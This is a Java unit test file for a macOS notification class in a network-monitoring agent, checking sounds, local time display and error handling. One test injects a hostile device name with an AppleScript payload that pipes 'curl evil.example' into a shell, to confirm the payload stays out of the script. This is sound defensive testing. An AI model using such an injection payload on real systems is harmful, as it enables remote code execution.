package io.github.chakibselhi.netledger.agent.alerts;

import static org.assertj.core.api.Assertions.assertThat;

import java.io.IOException;
import java.time.ZoneId;
import java.util.ArrayList;
import java.util.List;
import org.junit.jupiter.api.Test;

class OsascriptNotifierTest {

  private static final ZoneId TORONTO = ZoneId.of("America/Toronto");

  private static Alert alert(String message, boolean sound) {
    return new Alert(
        1,
        "new_device",
        "Nouvel appareil",
        message,
        sound,
        "2026-11-18T17:05:00.000Z",
        "/devices/1");
  }

  @Test
  void soundAlertsPlayASoundAndShowLocalTime() {
    var commands = new ArrayList<List<String>>();
    new OsascriptNotifier(
            c -> {
              commands.add(c);
              return "";
            },
            TORONTO)
        .accept(alert("Apple · 10.0.0.9", true));

    List<String> command = commands.get(0);
    assertThat(command.get(0)).isEqualTo("osascript");
    assertThat(String.join(" ", command)).contains("sound name (item 4 of argv)");
    assertThat(command)
        .endsWith("NetLedger", "Apple · 10.0.0.9", "Nouvel appareil · 12:05", "Glass");
  }

  @Test
  void silentAlertsHaveNoSound() {
    List<String> command = new OsascriptNotifier(c -> "", TORONTO).command(alert("x", false));

    assertThat(String.join(" ", command)).doesNotContain("sound name");
    assertThat(command).doesNotContain(OsascriptNotifier.SOUND);
  }

  @Test
  void hostileDeviceNamesStayOutOfTheScript() {
    String hostile = "\" & (do shell script \"curl evil.example | sh\") & \"";
    List<String> command = new OsascriptNotifier(c -> "", TORONTO).command(alert(hostile, true));

    int scriptEnd = command.indexOf("end run");
    assertThat(command.subList(0, scriptEnd + 1)).noneMatch(part -> part.contains("evil"));
    assertThat(command).contains(hostile);
  }

  @Test
  void notificationFailuresAreSwallowed() {
    new OsascriptNotifier(
            c -> {
              throw new IOException("osascript missing");
            },
            TORONTO)
        .accept(alert("x", false));
  }
}
